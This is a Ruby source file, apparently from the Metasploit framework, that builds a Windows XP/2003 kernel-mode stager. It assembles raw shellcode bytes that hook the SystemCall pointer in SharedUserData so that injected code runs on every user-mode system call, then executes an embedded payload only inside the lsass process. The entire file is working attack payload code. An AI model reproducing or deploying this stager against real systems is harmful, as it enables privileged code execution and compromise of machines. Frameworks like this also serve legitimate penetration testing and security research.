module Rex
module Payloads
module Win32
module Kernel

#
# Stagers are responsible for reading in another payload and executing it.
# The reading in of the payload may actually be as simple as copying it to
# another location.  The executing of it may be done either directly or
# indirectly.
#
module Stager

	#
	# XP SP2/2K3 SP1 ONLY
	#
	# Returns a kernel-mode stager that transitions from r0 to r3 by placing
	# code in an unused portion of SharedUserData and then pointing the
	# SystemCall attribute to that unused portion.  This has the effect of
	# causing the custom code to be called every time a user-mode process
	# tries to make a system call.  The returned payload also checks to make
	# sure that it's running in the context of lsass before actually running
	# the embedded payload.
	#
	def self.sud_syscall_hook(opts = {})
		r0_recovery = opts['RecoveryStub'] || Recovery.default
		r3_payload  = opts['UserModeStub'] || ''
		r3_prefix   = _run_only_in_lsass_stub("\xff\x25\x08\x03\xfe\x7f")
		r3_size     = ((r3_prefix.length + r3_payload.length + 3) & ~0x3) / 4

		r0_stager =
			"\xeb" + [0x1d + r0_recovery.length].pack('C') +
			"\xbb\x01\x03\xdf\xff\x4b\xfc\x8d\x7b\x7c\x5e" +
			"\x6a" + [r3_size].pack('C')  + "\x59\xf3\xa5\x8b\x03" +
			"\x8d\x4b\x08\x89\x01\xc7\x03\x7c\x03\xfe\x7f" + 
			r0_recovery +
			"\xe8" + [0xffffffde - r0_recovery.length].pack('V') +
			r3_prefix +
			r3_payload

		return r0_stager
	end

protected

	#
	# This stub is used by stagers to check to see if the code is
	# runing in the context of lsass.  If it isn't, it runs the code
	# specified by append.  Otherwise, it jumps past that code and
	# into what should be the expected r3 payload to execute.  This
	# stub also makes sure that the payload does not run more than
	# once.
	#
	def self._run_only_in_lsass_stub(append = '')
		"\x60\xbb\x3c\x06\x02\x00\x8b\x0b\x03\x4b\x03\x81\xf9" +
		"\x6c\x61\x73\x73\x75\x13\x6a\x30\x5b\x64\x8b\x1b\x43" +
		"\x43\x43\x80\x3b\x01\x74\x05\xc6\x03\x01" +
		"\xeb" + [append.length + 1].pack('C') + 
		"\x61" + append
	end

end

end
end
end
end
